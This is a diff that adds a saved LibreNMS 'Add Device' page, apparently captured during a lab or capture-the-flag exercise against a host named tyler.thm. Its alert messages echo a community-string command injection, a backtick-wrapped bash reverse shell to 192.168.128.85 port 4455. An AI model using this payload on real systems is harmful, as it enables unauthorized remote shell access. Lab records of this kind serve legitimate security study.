@@ -1,0 +1,604 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <title>LibreNMS</title>
+  <base href="http://tyler.thm:8080/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16">
+  <link rel="manifest" href="images/manifest.json">
+  <link rel="mask-icon" href="images/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="images/favicon.ico">
+  <meta name="msapplication-config" content="images/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+  <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/bootstrap-datetimepicker.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/bootstrap-switch.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/toastr.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/jquery-ui.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/jquery.bootgrid.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/tagmanager.css" rel="stylesheet" type="text/css" />
+  <link href="css/mktree.css" rel="stylesheet" type="text/css" />
+  <link href="css/vis.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/jquery.gridster.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/leaflet.css" rel="stylesheet" type="text/css" />
+  <link href="css/MarkerCluster.css" rel="stylesheet" type="text/css" />
+  <link href="css/MarkerCluster.Default.css" rel="stylesheet" type="text/css" />
+  <link href="css/L.Control.Locate.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/leaflet.awesome-markers.css" rel="stylesheet" type="text/css" />
+  <link href="css/select2.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/select2-bootstrap.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/query-builder.default.min.css" rel="stylesheet" type="text/css" />
+  <link href="css/styles.css?ver=20181128" rel="stylesheet" type="text/css" />
+  <link href="css/light.css?ver=632417642" rel="stylesheet" type="text/css" />
+  <script src="js/polyfill.min.js"></script>
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/bootstrap-hover-dropdown.min.js"></script>
+  <script src="js/bootstrap-switch.min.js"></script>
+  <script src="js/hogan-2.0.0.js"></script>
+  <script src="js/jquery.cycle2.min.js"></script>
+  <script src="js/moment.min.js"></script>
+  <script src="js/bootstrap-datetimepicker.min.js"></script>
+  <script src="js/typeahead.bundle.min.js"></script>
+  <script src="js/jquery-ui.min.js"></script>
+  <script src="js/tagmanager.js"></script>
+  <script src="js/mktree.js"></script>
+  <script src="js/jquery.bootgrid.min.js"></script>
+  <script src="js/handlebars.min.js"></script>
+  <script src="js/pace.min.js"></script>
+  <script src="js/qrcode.min.js"></script>
+      <script src="js/jquery.lazyload.min.js"></script>
+  <script src="js/lazyload.js"></script>
+      <script src="js/select2.min.js"></script>
+  <script src="js/librenms.js?ver=20181130"></script>
+  <script type="text/javascript">
+
+    <!-- Begin
+    function popUp(URL)
+    {
+      day = new Date();
+      id = day.getTime();
+      eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=550,height=600');");
+    }
+    // End -->
+  </script>
+  <script type="text/javascript" src="js/overlib_mini.js"></script>
+  <script type="text/javascript" src="js/toastr.min.js"></script>
+</head>
+<body>
+
+<script>updateResolution();</script>
+<nav class="navbar navbar-default  navbar-fixed-top" role="navigation">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navHeaderCollapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+<a class="hidden-md hidden-sm navbar-brand" href=""><img src="images/librenms_logo_light.svg" /></a>    </div>
+
+    <div class="collapse navbar-collapse" id="navHeaderCollapse">
+      <ul class="nav navbar-nav">
+        <li class="dropdown">
+          <a href="overview/" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"><i class="fa fa-home fa-fw fa-lg fa-nav-icons hidden-md" aria-hidden="true"></i> <span class="hidden-sm">Overview</span></a>
+          <ul class="dropdown-menu multi-level" role="menu">
+              <li><a href="overview/"><i class="fa fa-tv fa-fw fa-lg" aria-hidden="true"></i> Dashboard</a></li>
+           <li class="dropdown-submenu">
+            <a href="overview/"><i class="fa fa-map fa-fw fa-lg" aria-hidden="true"></i> Maps</a>
+            <ul class="dropdown-menu">
+              <li><a href="availability-map/"><i class="fa fa-arrow-circle-up fa-fw fa-lg" aria-hidden="true"></i> Availability</a></li>
+              <li><a href="map/"><i class="fa fa-sitemap fa-fw fa-lg" aria-hidden="true"></i> Network</a></li>
+                              <li><a href="fullscreenmap/"><i class="fa fa-expand fa-fw fa-lg" aria-hidden="true"></i> Geographical</a></li>
+            </ul>
+          </li>
+          <li class="dropdown-submenu">
+            <a><i class="fa fa-plug fa-fw fa-lg" aria-hidden="true"></i> Plugins</a>
+            <ul class="dropdown-menu">
+                <li><a href="plugin/view=admin"> <i class="fa fa-lock fa-fw fa-lg" aria-hidden="true"></i>Plugin Admin</a></li>            </ul>
+          </li>
+          <li class="dropdown-submenu">
+           <a href="overview/"><i class="fa fa-wrench fa-fw fa-lg" aria-hidden="true"></i> Tools</a>
+           <ul class="dropdown-menu scrollable-menu">
+           <li><a href="ripenccapi/"><i class="fa fa-star fa-fw fa-lg" aria-hidden="true"></i> RIPE NCC API</a></li>
+           </ul>
+          </li>
+            <li role="presentation" class="divider"></li>
+            <li><a href="eventlog/"><i class="fa fa-bookmark fa-fw fa-lg" aria-hidden="true"></i> Eventlog</a></li>
+            <li><a href="inventory/"><i class="fa fa-cube fa-fw fa-lg" aria-hidden="true"></i> Inventory</a></li>
+            <li role="presentation" class="divider"></li>
+            <li><a href="search/search=ipv4/"><i class="fa fa-search fa-fw fa-lg" aria-hidden="true"></i> IPv4 Address</a></li>
+            <li><a href="search/search=ipv6/"><i class="fa fa-search fa-fw fa-lg" aria-hidden="true"></i> IPv6 Address</a></li>
+            <li><a href="search/search=mac/"><i class="fa fa-search fa-fw fa-lg" aria-hidden="true"></i> MAC Address</a></li>
+            <li><a href="search/search=arp/"><i class="fa fa-search fa-fw fa-lg" aria-hidden="true"></i> ARP Tables</a></li>
+            <li><a href="search/search=fdb/"><i class="fa fa-search fa-fw fa-lg" aria-hidden="true"></i> FDB Tables</a></li>
+          </ul>
+        </li>
+        <li class="dropdown">
+          <a href="devices/" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"><i class="fa fa-server fa-fw fa-lg fa-nav-icons hidden-md" aria-hidden="true"></i> <span class="hidden-sm">Devices</span></a>
+          <ul class="dropdown-menu">
+<li class="dropdown-submenu"><a href="#">No devices</a></li>
+            <li role="presentation" class="divider"></li><li><a href="device-groups/"><i class="fa fa-th fa-fw fa-lg" aria-hidden="true"></i> Manage Groups</a></li><li><a href="device-dependencies/"><i class="fa fa-group fa-fw fa-lg"></i> Device Dependencies</a></li>
+            <li role="presentation" class="divider"></li>
+            <li><a href="addhost/"><i class="fa fa-plus fa-fw fa-lg" aria-hidden="true"></i> Add Device</a></li>
+            <li><a href="delhost/"><i class="fa fa-trash fa-fw fa-lg" aria-hidden="true"></i> Delete Device</a></li>          </ul>
+        </li>
+
+
+    <!-- PORTS -->
+        <li class="dropdown">
+          <a href="ports/" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"><i class="fa fa-link fa-fw fa-lg fa-nav-icons hidden-md" aria-hidden="true"></i> <span class="hidden-sm">Ports</span></a>
+          <ul class="dropdown-menu">
+            <li><a href="ports/"><i class="fa fa-link fa-fw fa-lg" aria-hidden="true"></i> All Ports</a></li>
+
+            <li><a href="pseudowires/"><i class="fa fa-arrows-alt fa-fw fa-lg" aria-hidden="true"></i> Pseudowires</a></li>            <li role="presentation" class="divider"></li>            <li><a href="customers/"><i class="fa fa-users fa-fw fa-lg" aria-hidden="true"></i> Customers</a></li>            <li><a href="iftype/type=transit/"><i class="fa fa-truck fa-fw fa-lg" aria-hidden="true"></i> Transit</a></li>            <li><a href="iftype/type=peering/"><i class="fa fa-handshake-o fa-fw fa-lg" aria-hidden="true"></i> Peering</a></li>            <li><a href="iftype/type=peering,transit/"><i class="fa fa-rocket fa-fw fa-lg" aria-hidden="true"></i> Peering + Transit</a></li>            <li><a href="iftype/type=core/"><i class="fa fa-code-fork fa-fw fa-lg" aria-hidden="true"></i> Core</a></li>            <li role="presentation" class="divider"></li>
+            <li><a href="ports/state=down/"><i class="fa fa-arrow-circle-down fa-fw fa-lg" aria-hidden="true"></i> Down</a></li>
+            <li><a href="ports/state=admindown/"><i class="fa fa-arrow-circle-o-down fa-fw fa-lg" aria-hidden="true"></i> Disabled</a></li>
+
+          </ul>
+        </li>
+
+        <li class="dropdown">
+          <a href="health/" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"><i class="fa fa-heartbeat fa-fw fa-lg fa-nav-icons hidden-md" aria-hidden="true"></i> <span class="hidden-sm">Health</span></a>
+          <ul class="dropdown-menu">
+            <li><a href="health/metric=mempool/"><i class="fa fa-braille fa-fw fa-lg" aria-hidden="true"></i> Memory</a></li>
+            <li><a href="health/metric=processor/"><i class="fa fa-microchip fa-fw fa-lg" aria-hidden="true"></i> Processor</a></li>
+            <li><a href="health/metric=storage/"><i class="fa fa-database fa-fw fa-lg" aria-hidden="true"></i> Storage</a></li>
+<li role="presentation" class="divider"></li><li><a href="health/metric=toner/"><i class="fa fa-print fa-fw fa-lg"></i> Toner</a></li>
+
+          </ul>
+        </li>
+
+      <li class="dropdown">
+          <a href="#" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"><i class="fa fa-exclamation-circle fa-col-success fa-fw fa-lg fa-nav-icons hidden-md" aria-hidden="true"></i> <span class="hidden-sm">Alerts</span></a>
+          <ul class="dropdown-menu">
+              <li><a href="alerts/"><i class="fa fa-bell fa-fw fa-lg" aria-hidden="true"></i> Notifications</a></li>
+              <li><a href="alert-log/"><i class="fa fa-file-text fa-fw fa-lg" aria-hidden="true"></i> Alert History</a></li>
+              <li><a href="alert-stats/"><i class="fa fa-bar-chart fa-fw fa-lg" aria-hidden="true"></i> Statistics</a></li>
+                                    <li role="presentation" class="divider"></li>
+                    <li><a href="alert-rules/"><i class="fa fa-list fa-fw fa-lg" aria-hidden="true"></i> Alert Rules</a></li>
+                    <li><a href="alert-schedule/"><i class="fa fa-calendar fa-fw fa-lg" aria-hidden="true"></i> Scheduled Maintenance</a></li>
+                    <li><a href="templates/"><i class="fa fa-file fa-fw fa-lg" aria-hidden="true"></i> Alert Templates</a></li>
+                    <li><a href="alert-transports/"><i class="fa fa-bus fa-fw fa-lg" aria-hidden="true"></i> Alert Transports</a></li>
+                          </ul>
+      </li>
+
+
+    </ul>
+     <form role="search" class="navbar-form navbar-right global-search">
+         <div class="form-group">
+             <input class="form-control typeahead" type="search" id="gsearch" name="gsearch" placeholder="Global Search">
+         </div>
+     </form>
+    <ul class="nav navbar-nav navbar-right">
+      <li class="dropdown">
+<a href="#" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown"><i class="fa fa-user fa-fw fa-lg fa-nav-icons" aria-hidden="true"></i> <span class="visible-xs-inline-block">User</span><span class="badge badge-navbar-user count-notif badge-default">0</span></a>        <ul class="dropdown-menu">
+          <li><a href="preferences/"><i class="fa fa-cog fa-fw fa-lg" aria-hidden="true"></i> My Settings</a></li>
+<li><a href="notifications/"><span class="badge count-notif">0</span> Notifications</a></li>          <li role="presentation" class="divider"></li>
+<li><a href="http://10.10.133.54:8080/logout" onclick="event.preventDefault(); document.getElementById('logout-form').submit();"> <i class="fa fa-sign-out fa-fw fa-lg" aria-hidden="true"></i> Logout</a><form id="logout-form" action="http://10.10.133.54:8080/logout" method="POST" style="display: none;"><input type="hidden" name="_token" value="lAwTjJUZw4yCSDyIub4YdhXzi9mVXHjb9fVkjXYf"></form></li>         </ul>
+       </li>
+      <li class="dropdown">
+        <a href="#" class="dropdown-toggle" data-hover="dropdown" data-toggle="dropdown" style="margin-left:5px"><i class="fa fa-cog fa-fw fa-lg fa-nav-icons" aria-hidden="true"></i> <span class="visible-xs-inline-block">Settings</span></a>
+        <ul class="dropdown-menu">
+<li><a href="settings/"><i class="fa fa-cogs fa-fw fa-lg" aria-hidden="true"></i> Global Settings</a></li><li><a href="validate/"><i class="fa fa-check-circle fa-fw fa-lg" aria-hidden="true"></i> Validate Config</a></li>          <li role="presentation" class="divider"></li>
+
+
+           <li><a href="adduser/"><i class="fa fa-user-plus fa-fw fa-lg" aria-hidden="true"></i> Add User</a></li>
+           <li><a href="deluser/"><i class="fa fa-user-times fa-fw fa-lg" aria-hidden="true"></i> Remove User</a></li>
+           
+           <li><a href="edituser/"><i class="fa fa-user-circle-o fa-fw fa-lg" aria-hidden="true"></i> Edit User</a></li>
+           <li><a href="authlog/"><i class="fa fa-shield fa-fw fa-lg" aria-hidden="true"></i> Auth History</a></li>
+           <li role="presentation" class="divider"></li> 
+           <li class="dropdown-submenu">
+               <a href="pollers"><i class="fa fa-th-large fa-fw fa-lg" aria-hidden="true"></i> Pollers</a>
+               <ul class="dropdown-menu scrollable-menu">
+               <li><a href="pollers/tab=pollers/"><i class="fa fa-th-large fa-fw fa-lg" aria-hidden="true"></i> Pollers</a></li>    <li><a href="pollers/tab=performance/"><i class="fa fa-line-chart fa-fw fa-lg" aria-hidden="true"></i> Performance</a></li>    <li><a href="pollers/tab=log/"><i class="fa fa-file-text fa-fw fa-lg" aria-hidden="true"></i> History</a></li>
+               </ul>
+           </li>
+           <li role="presentation" class="divider"></li>
+           <li class="dropdown-submenu">
+           <a href="#"><i class="fa fa-code fa-fw fa-lg" aria-hidden="true"></i> API</a>
+           <ul class="dropdown-menu scrollable-menu">
+             <li><a href="api-access/"><i class="fa fa-cog fa-fw fa-lg" aria-hidden="true"></i> API Settings</a></li>
+             <li><a href="https://docs.librenms.org/API/" target="_blank" rel="noopener"><i class="fa fa-book fa-fw fa-lg" aria-hidden="true"></i> API Docs</a></li>
+           </ul>
+           </li>
+           <li role="presentation" class="divider"></li>
+           <li class="dropdown-submenu">
+               <a href="#"><span class="countdown_timer" id="countdown_timer"></span></a>
+               <ul class="dropdown-menu scrollable-menu">
+                   <li><a href="#"><span class="countdown_timer_status" id="countdown_timer_status"></span></a></li>
+               </ul>
+           </li>
+           <li role="presentation" class="divider"></li>
+           <li><a href="about/"><i class="fa fa-info-circle fa-fw fa-lg" aria-hidden="true"></i> About&nbsp;LibreNMS</a></li>
+         </ul>
+       </li>
+     </ul>
+   </div>
+ </div>
+</nav>
+<script>
+var devices = new Bloodhound({
+  datumTokenizer: Bloodhound.tokenizers.obj.whitespace('name'),
+  queryTokenizer: Bloodhound.tokenizers.whitespace,
+  remote: {
+      url: "ajax_search.php?search=%QUERY&type=device",
+        filter: function (devices) {
+            return $.map(devices, function (device) {
+                return {
+                    device_id: device.device_id,
+                    device_image: device.device_image,
+                    url: device.url,
+                    name: device.name,
+                    device_os: device.device_os,
+                    version: device.version,
+                    device_hardware: device.device_hardware,
+                    device_ports: device.device_ports,
+                    location: device.location
+                };
+            });
+        },
+      wildcard: "%QUERY"
+  }
+});
+var ports = new Bloodhound({
+  datumTokenizer: Bloodhound.tokenizers.obj.whitespace('name'),
+  queryTokenizer: Bloodhound.tokenizers.whitespace,
+  remote: {
+      url: "ajax_search.php?search=%QUERY&type=ports",
+        filter: function (ports) {
+            return $.map(ports, function (port) {
+                return {
+                    count: port.count,
+                    url: port.url,
+                    name: port.name,
+                    description: port.description,
+                    colours: port.colours,
+                    hostname: port.hostname
+                };
+            });
+        },
+      wildcard: "%QUERY"
+  }
+});
+var bgp = new Bloodhound({
+  datumTokenizer: Bloodhound.tokenizers.obj.whitespace('name'),
+  queryTokenizer: Bloodhound.tokenizers.whitespace,
+  remote: {
+      url: "ajax_search.php?search=%QUERY&type=bgp",
+        filter: function (bgp_sessions) {
+            return $.map(bgp_sessions, function (bgp) {
+                return {
+                    count: bgp.count,
+                    url: bgp.url,
+                    name: bgp.name,
+                    description: bgp.description,
+                    localas: bgp.localas,
+                    bgp_image: bgp.bgp_image,
+                    remoteas: bgp.remoteas,
+                    colours: bgp.colours,
+                    hostname: bgp.hostname
+                };
+            });
+        },
+      wildcard: "%QUERY"
+  }
+});
+
+if ($(window).width() < 768) {
+    var cssMenu = 'typeahead-left';
+} else {
+    var cssMenu = '';
+}
+
+devices.initialize();
+ports.initialize();
+bgp.initialize();
+$('#gsearch').bind('typeahead:select', function(ev, suggestion) {
+    window.location.href = suggestion.url;
+});
+$('#gsearch').typeahead({
+    hint: true,
+    highlight: true,
+    minLength: 1,
+    classNames: {
+        menu: cssMenu
+    }
+},
+{
+  source: devices.ttAdapter(),
+  limit: '8',
+  async: true,
+  display: 'name',
+  valueKey: 'name',
+    templates: {
+        header: '<h5><strong>&nbsp;Devices</strong></h5>',
+        suggestion: Handlebars.compile('<p><a href="{{url}}"><img src="{{device_image}}" border="0"> <small><strong>{{name}}</strong> | {{device_os}} | {{version}} | {{device_hardware}} with {{device_ports}} port(s) | {{location}}</small></a></p>')
+    }
+},
+{
+  source: ports.ttAdapter(),
+  limit: '8',
+  async: true,
+  display: 'name',
+  valueKey: 'name',
+    templates: {
+        header: '<h5><strong>&nbsp;Ports</strong></h5>',
+        suggestion: Handlebars.compile('<p><a href="{{url}}"><small><i class="fa fa-link fa-sm icon-theme" aria-hidden="true"></i> <strong>{{name}}</strong> – {{hostname}}<br /><i>{{description}}</i></small></a></p>')
+    }
+},
+{
+  source: bgp.ttAdapter(),
+  limit: '8',
+  async: true,
+  display: 'name',
+  valueKey: 'name',
+    templates: {
+        header: '<h5><strong>&nbsp;BGP Sessions</strong></h5>',
+        suggestion: Handlebars.compile('<p><a href="{{url}}"><small>{{{bgp_image}}} {{name}} - {{hostname}}<br />AS{{localas}} -> AS{{remoteas}}</small></a></p>')
+    }
+});
+$('#gsearch').bind('typeahead:open', function(ev, suggestion) {
+    $('#gsearch').addClass('search-box');
+});
+</script>
+
+<br />
+<div class="container-fluid">
+  <div class="row">
+    <div class="col-md-12">
+<div class="row">
+            <div class="col-sm-3">
+            </div>
+            <div class="col-sm-6"><div class="alert alert-success"><i class="fa fa-fw fa-check-circle" aria-hidden="true"></i> Adding host 127.0.0.3 community public`bash -c "bash -i >& /dev/tcp/192.168.128.85/4455 0>&1"` port 161 using udp</div><div class="alert alert-danger"><i class="fa fa-fw fa-exclamation-circle" aria-hidden="true"></i> Could not connect to 127.0.0.3, please check the snmp details and snmp reachability</div><div class="alert alert-danger"><i class="fa fa-fw fa-exclamation-circle" aria-hidden="true"></i> SNMP v2c: No reply with community public`bash -c "bash -i >& /dev/tcp/192.168.128.85/4455 0>&1"`</div>    </div>
+        <div class="col-sm-3">
+        </div>
+    </div>
+<div class="row">
+  <div class="col-sm-3">
+  </div>
+  <div class="col-sm-6">
+<form name="form1" method="post" action="" class="form-horizontal" role="form">
+  <div><h2>Add Device</h2></div>
+  <div class="alert alert-info">Devices will be checked for Ping/SNMP reachability before being probed.</div>
+  <div class="well well-lg">
+      <div class="form-group">
+          <label for="hostname" class="col-sm-3 control-label">Hostname</label>
+          <div class="col-sm-9">
+              <input type="text" id="hostname" name="hostname" class="form-control input-sm" placeholder="Hostname">
+          </div>
+      </div>
+      <div class='form-group'>
+        <label for='hardware' class='col-sm-3 control-label'>SNMP</label>
+        <div class='col-sm-4'>
+            <input type="checkbox" id="snmp" name="snmp" data-size="small" onChange="disableSnmp(this);" checked>
+        </div>
+    </div>
+    <div id='snmp_override' style="display: none;">
+        <div class='form-group'>
+            <label for='sysName' class='col-sm-3 control-label'>sysName (optional)</label>
+            <div class='col-sm-9'>
+                <input id='sysName' class='form-control' name='sysName' placeholder="sysName (optional)"/>
+            </div>
+        </div>
+        <div class='form-group'>
+            <label for='hardware' class='col-sm-3 control-label'>Hardware (optional)</label>
+            <div class='col-sm-9'>
+                <input id='hardware' class='form-control' name='hardware' placeholder="Hardware (optional)"/>
+            </div>
+        </div>
+        <div class='form-group'>
+            <label for='os' class='col-sm-3 control-label'>OS (optional)</label>
+            <div class='col-sm-9'>
+                <input id='os' class='form-control' name='os' placeholder="OS (optional)"/>
+                <input type='hidden' id='os_id' class='form-control' name='os_id' />
+            </div>
+        </div>
+    </div>
+    <div id="snmp_conf" style="display: block;">
+        <div class="form-group">
+          <label for="snmpver" class="col-sm-3 control-label">SNMP Version</label>
+          <div class="col-sm-3">
+            <select name="snmpver" id="snmpver" class="form-control input-sm" onChange="changeForm();">
+              <option value="v1">v1</option>
+              <option value="v2c" selected>v2c</option>
+              <option value="v3">v3</option>
+            </select>
+          </div>
+          <div class="col-sm-3">
+            <input type="text" name="port" placeholder="port" class="form-control input-sm">
+          </div>
+          <div class="col-sm-3">
+            <select name="transport" id="transport" class="form-control input-sm">
+<option value='udp'>udp</option><option value='udp6'>udp6</option><option value='tcp'>tcp</option><option value='tcp6'>tcp6</option>            </select>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="port_association_mode" class="col-sm-3 control-label">Port Association Mode</label>
+          <div class="col-sm-3">
+            <select name="port_assoc_mode" id="port_assoc_mode" class="form-control input-sm">
+              <option value="ifIndex" selected>ifIndex</option>
+              <option value="ifName" >ifName</option>
+              <option value="ifDescr" >ifDescr</option>
+              <option value="ifAlias" >ifAlias</option>
+            </select>
+          </div>
+        </div>
+        <div id="snmpv1_2">
+          <div class="form-group">
+            <div class="col-sm-12 alert alert-info">
+              <label class="control-label text-left input-sm">SNMPv1/2c Configuration</label>
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="community" class="col-sm-3 control-label">Community</label>
+            <div class="col-sm-9">
+              <input type="text" name="community" id="community" placeholder="Community" class="form-control input-sm">
+            </div>
+          </div>
+        </div>
+        <div id="snmpv3">
+          <div class="form-group">
+            <div class="col-sm-12 alert alert-info">
+              <label class="control-label text-left input-sm">SNMPv3 Configuration</label>
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="authlevel" class="col-sm-3 control-label">Auth Level</label>
+            <div class="col-sm-3">
+              <select name="authlevel" id="authlevel" class="form-control input-sm">
+                <option value="noAuthNoPriv" selected>noAuthNoPriv</option>
+                <option value="authNoPriv">authNoPriv</option>
+                <option value="authPriv">authPriv</option>
+              </select>
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="authname" class="col-sm-3 control-label">Auth User Name</label>
+            <div class="col-sm-9">
+              <input type="text" name="authname" id="authname" class="form-control input-sm" autocomplete="off">
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="authpass" class="col-sm-3 control-label">Auth Password</label>
+            <div class="col-sm-9">
+              <input type="text" name="authpass" id="authpass" placeholder="AuthPass" class="form-control input-sm" autocomplete="off">
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="authalgo" class="col-sm-3 control-label">Auth Algorithm</label>
+            <div class="col-sm-9">
+              <select name="authalgo" id="authalgo" class="form-control input-sm">
+                <option value="MD5" selected>MD5</option>
+                <option value="SHA">SHA</option>
+              </select>
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="cryptopass" class="col-sm-3 control-label">Crypto Password</label>
+            <div class="col-sm-9">
+              <input type="text" name="cryptopass" id="cryptopass" placeholder="Crypto Password" class="form-control input-sm" autocomplete="off">
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="cryptoalgo" class="col-sm-3 control-label">Crypto Algorithm</label>
+            <div class="col-sm-9">
+              <select name="cryptoalgo" id="cryptoalgo" class="form-control input-sm">
+                <option value="AES" selected>AES</option>
+                <option value="DES">DES</option>
+              </select>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="form-group">
+          <div class="col-sm-offset-3 col-sm-9">
+              <div class="checkbox">
+                  <label>
+                      <input type="checkbox" name="force_add" id="force_add"> Force add - No ICMP or SNMP checks performed
+                  </label>
+              </div>
+          </div>
+      </div>
+    <hr>
+    <center><button type="submit" class="btn btn-default" name="Submit">Add Device</button></center>
+  </div>
+</form>
+  </div>
+  <div class="col-sm-3">
+  </div>
+</div>
+<script>
+    function changeForm() {
+        snmpVersion = $("#snmpver").val();
+        if(snmpVersion == 'v1' || snmpVersion == 'v2c') {
+            $('#snmpv1_2').show();
+            $('#snmpv3').hide();
+        }
+        else if(snmpVersion == 'v3') {
+            $('#snmpv1_2').hide();
+            $('#snmpv3').show();
+        }
+    }
+    $('#snmpv3').toggle();
+
+    function disableSnmp(e) {
+        if(e.checked) {
+            $('#snmp_conf').show();
+            $('#snmp_override').hide();
+        } else {
+            $('#snmp_conf').hide();
+            $('#snmp_override').show();
+        }
+    }
+
+    var os_suggestions = new Bloodhound({
+        datumTokenizer: Bloodhound.tokenizers.obj.whitespace('text'),
+        queryTokenizer: Bloodhound.tokenizers.whitespace,
+        remote: {
+            url: "ajax_ossuggest.php?term=%QUERY",
+            filter: function (output) {
+                return $.map(output, function (item) {
+                    return {
+                        text: item.text,
+                        os: item.os,
+                    };
+                });
+            },
+            wildcard: "%QUERY"
+        }
+    });
+    os_suggestions.initialize();
+    $('#os').typeahead({
+            hint: true,
+            highlight: true,
+            minLength: 1,
+            classNames: {
+                menu: 'typeahead-left'
+            }
+        },
+        {
+            source: os_suggestions.ttAdapter(),
+            async: true,
+            displayKey: 'text',
+            valueKey: 'os',
+            templates: {
+                suggestion: Handlebars.compile('<p>&nbsp;{{text}}</p>')
+            },
+            limit: 20
+        });
+
+    $("#os").on("typeahead:selected typeahead:autocompleted", function(e,datum) {
+        $("#os_id").val(datum.os);
+        $("#os").html('<mark>' + datum.text + '</mark>');
+    });
+
+    $("[name='snmp']").bootstrapSwitch('offColor','danger');
+</script>
+    </div>
+  </div>
+</div>
+<script type="text/javascript">
+document.title = 'Add host - LibreNMS';
+</script>
+<script>
+        toastr.options.timeout = 10;
+        toastr.options.extendedTimeOut = 20;
+        </script>
+    <script type="text/javascript">
+    var no_refresh = true;
+    $(document).ready(function() {
+        $("#countdown_timer").html("Refresh disabled");
+        $("#countdown_timer_status").html("<i class=\"fa fa-pause fa-fw fa-lg\"></i>");
+        $("#countdown_timer_status").click("", function(event) {
+            event.preventDefault();
+        });
+     });
+</script><script type="text/javascript"></script></body>
+</html>
